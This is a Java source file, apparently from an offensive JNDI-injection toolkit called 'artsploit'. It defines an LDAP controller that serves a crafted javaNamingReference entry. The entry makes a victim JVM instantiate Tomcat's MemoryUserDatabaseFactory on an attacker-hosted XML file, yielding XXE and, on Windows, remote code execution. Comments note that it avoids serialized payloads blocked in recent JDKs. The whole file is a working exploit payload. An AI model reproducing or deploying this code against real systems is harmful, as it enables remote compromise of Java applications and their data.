package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

/**
 * Yields:
 * XXE/RCE(on Windows only) via Tomcat MemoryUserDatabaseFactory
 * This version uses a Reference with the factory class name directly in the LDAP entry
 * rather than serialized data which is blocked by default in recent JDK versions.
 * @see <a href="https://tttang.com/archive/1405/#toc_0x02-xxe-rce">for details</a>

 * Command - URL to the HTTP server that contains the XML file.

 * Requires:
 *  Tomcat 8+
 *  - tomcat-embed-core.jar
 *  - tomcat-embed-el.jar
 */

@LdapMapping(uri = { "/o=tomcat-user-database-local-factory" })
public class TomcatMemoryUserDatabaseLocalFactory implements LdapController {

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP Reference result for " + base + " with Tomcat UserDatabase local factory payload");

        Entry e = new Entry(base);

        // Set the object class to create a Reference
        e.addAttribute("objectClass", "javaNamingReference");

        // Set the Java class name to load
        e.addAttribute("javaClassName", "org.apache.catalina.UserDatabase");

        // Specify the factory class directly
        e.addAttribute("javaFactory", "org.apache.catalina.users.MemoryUserDatabaseFactory");

        System.out.println("[DEBUG] Using XML path: " + Config.command);

        // Format should be exactly: "#[index]#[type]#[content]"
        // This matches what Java's LDAP reference parser expects
        e.addAttribute("javaReferenceAddress", "#0#pathname#" + Config.command);
        e.addAttribute("javaReferenceAddress", "#1#readonly#false");

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}